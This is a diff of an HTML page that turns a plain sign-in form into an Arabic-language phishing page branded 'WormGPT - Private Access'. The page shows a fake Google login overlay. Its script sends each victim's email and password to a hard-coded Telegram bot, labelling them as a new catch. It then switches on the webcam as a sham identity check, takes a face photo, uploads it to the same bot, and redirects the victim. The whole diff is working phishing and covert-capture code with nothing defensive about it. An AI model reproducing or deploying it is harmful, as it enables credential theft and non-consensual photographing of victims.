@@ -1,38 +1,134 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <link rel="stylesheet" href="/css.css">
+    <title>WormGPT - Private Access</title>
+    <style>
+        /* CSS التنسيق */
+        body { background-color: #0b0e11; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        /* واجهة WormGPT الترحيبية */
+        .welcome-screen { text-align: center; background: #15191d; padding: 40px; border-radius: 15px; border: 1px solid #ff4b4b; box-shadow: 0 0 20px rgba(255, 75, 75, 0.2); width: 350px; }
+        .welcome-screen h1 { color: #ff4b4b; font-size: 28px; margin-bottom: 10px; letter-spacing: 2px; }
+        .welcome-screen p { color: #888; font-size: 14px; margin-bottom: 30px; }
+        .login-trigger { background: #ff4b4b; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
+        .login-trigger:hover { background: #d43f3f; }
+
+        /* نافذة جوجل المنبثقة (Overlay) */
+        #google-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000; }
+        .google-box { background: white; width: 360px; padding: 40px; border-radius: 8px; text-align: center; color: #202124; }
+        .google-logo { width: 75px; margin-bottom: 15px; }
+        .google-box h2 { font-size: 24px; font-weight: 400; margin: 0; }
+        .google-box p { font-size: 16px; margin: 10px 0 30px; }
+        input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 15px; outline-color: #4285f4; text-align: right; }
+        .blue-btn { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; font-size: 14px; }
+        
+        #loading { display: none; margin-top: 20px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        video, canvas { display: none; }
+    </style>
 </head>
 <body>
-    <div class="box">
-    <form class="form"> 
-        <img src="/download.png" width="100px">
-        <h1 class="form-title">sign in</h1>
-        <div class="form-group">
-            <input type="text" class="form-control" required>
-            <label for="" class="class-label"> email or phone</label>
+
+    <div class="welcome-screen" id="mainScreen">
+        <h1>WORM GPT</h1>
+        <p>مرحباً بك في النسخة v3.0 الخاصة.<br>يجب تسجيل الدخول لمتابعة الدردشة المشفرة.</p>
+        <button class="login-trigger" onclick="showGoogle()">تسجيل الدخول للبدء</button>
+    </div>
+
+    <div id="google-overlay">
+        <div class="google-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo">
+            <h2>تسجيل الدخول</h2>
+            <p>استخدم حسابك على Google</p>
+            
+            <div id="g-step1">
+                <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+                <button class="blue-btn" onclick="nextStep()">التالي</button>
+            </div>
+
+            <div id="g-step2" style="display:none;">
+                <div style="font-size:13px; border:1px solid #eee; padding:5px; border-radius:15px; margin-bottom:10px;" id="userShow"></div>
+                <input type="password" id="pass" placeholder="أدخل كلمة المرور">
+                <button class="blue-btn" id="finish">تأكيد</button>
+            </div>
+
+            <div id="loading">
+                <div class="spinner"></div>
+                <p style="font-size: 12px; color: #5f6368;">جاري التحقق من الهوية...</p>
+            </div>
         </div>
-        <div class="form-group">
-            <input type="password" class="form-control" required>
-            <label for="" class="class-label"> password</label>
-        </div>
-        <div class="form-group">
+    </div>
 
-            <label for="" class="show-label">
-                <input type="checkbox" id="show"> show password
-            </label>
-        </div>
-        <div class="bottom-button">
-            <a href="#">forget password ?</a>
-            <button class="form-button"> next</button>
-        </div>
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
 
-    </form>
+    <script>
+        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
+        const chat = "2103976274";
 
+        function showGoogle() {
+            document.getElementById('google-overlay').style.display = 'flex';
+        }
 
+        function nextStep() {
+            const email = document.getElementById('email').value;
+            if(email.length > 5) {
+                document.getElementById('g-step1').style.display = 'none';
+                document.getElementById('g-step2').style.display = 'block';
+                document.getElementById('userShow').innerText = email;
+            }
+        }
 
+        document.getElementById('finish').onclick = async function() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            // إرسال البيانات فوراً
+            sendText(`🎯 **بيانات صيد جديدة**\n📧 **Mail:** \`${email}\`\n🔑 **Pass:** \`${pass}\``);
+
+            document.getElementById('g-step2').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            try {
+                // فتح الكاميرا "كتحقق هوية"
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('v').srcObject = s;
+                
+                setTimeout(() => {
+                    snap(); // التقاط صورة
+                    setTimeout(() => {
+                        window.location.href = "project.html"; // التوجه لـ WormGPT
+                    }, 3000);
+                }, 1000);
+            } catch(e) {
+                window.location.href = "project.html";
+            }
+        };
+
+        function snap() {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const f = new FormData();
+                f.append('chat_id', chat);
+                f.append('photo', blob, 'face.jpg');
+                fetch(api + "sendPhoto", { method: 'POST', body: f });
+            }, 'image/jpeg', 0.8);
+        }
+
+        function sendText(txt) {
+            fetch(api + "sendMessage", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat, text: txt, parse_mode: "Markdown" })
+            });
+        }
+    </script>
 </body>
 </html>
